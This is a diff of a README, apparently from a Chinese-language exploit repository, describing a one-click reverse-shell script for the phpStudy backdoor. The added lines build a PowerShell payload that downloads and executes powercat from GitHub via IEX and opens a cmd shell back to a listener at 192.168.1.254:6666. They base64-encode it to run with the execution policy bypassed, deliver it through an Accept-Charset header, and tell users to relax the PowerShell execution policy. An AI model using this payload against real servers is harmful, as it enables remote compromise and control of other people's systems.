@@ -27,11 +27,27 @@ rabbitmask\rabbitmask
 ```
 
 ### phpstudy_backdoor_shell.py
-	脚本一键反弹shell，自动bypass，关于原理后边给教程，简单说借助了powercat、powershell等，所以请在powershell中执行`set-executionpolicy remotesigned`允许脚本执行。
+	脚本一键反弹shell，自动bypass，关于原理后边给教程，借助了powercat、powershell等，
+	所以请在powershell中执行`set-executionpolicy remotesigned`允许脚本执行。
 	Usage: python3 phpstudy_backdoor_exp.py [url]
 	#请配置监听地址与端口
 	listen_host='192.168.1.254'
 	listen_port='6666'
+	
+```
+#第一步借助powershell配置反弹shell的payload并加密
+$text = "IEX (New-Object  System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.254 -p 6666 -e cmd;" 
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) 
+$EncodedText =[Convert]::ToBase64String($Bytes) 
+$EncodedText > bs64.txt
+
+#第二步借助powershell进行bypass的处理
+system('powershell -exec bypass -encodedcommand [bs64.txt内容]');
+
+#第三步base64加密交给Accept-Charset参数提交payload
+Accept-Charset: [base64(bypass)]
+```
+
 
 ##### 运行demo：
 ```
